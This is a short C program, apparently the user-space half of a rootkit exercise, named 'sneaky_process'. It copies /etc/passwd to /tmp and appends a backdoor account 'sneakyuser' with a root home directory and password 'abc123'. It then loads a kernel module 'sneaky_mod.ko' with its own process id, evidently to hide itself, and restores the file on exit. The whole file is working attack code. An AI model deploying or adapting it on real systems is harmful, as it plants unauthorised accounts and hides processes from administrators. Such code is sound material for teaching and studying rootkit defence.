#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
	printf("sneaky_process pid = %d\n", getpid());
	system("cp /etc/passwd /tmp");
	system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\" >> /etc/passwd");
	char temp[100];
	sprintf(temp,"insmod sneaky_mod.ko pid=%d",(int)getpid());
	system(temp);
	while(1){
	  char c = getchar();
	  if(c=='q'){
	    break;
	  }
	}
	system("rmmod sneaky_mod.ko");
	system("cp /tmp/passwd /etc");
	system("rm /tmp/passwd");
	return 0;
}
 
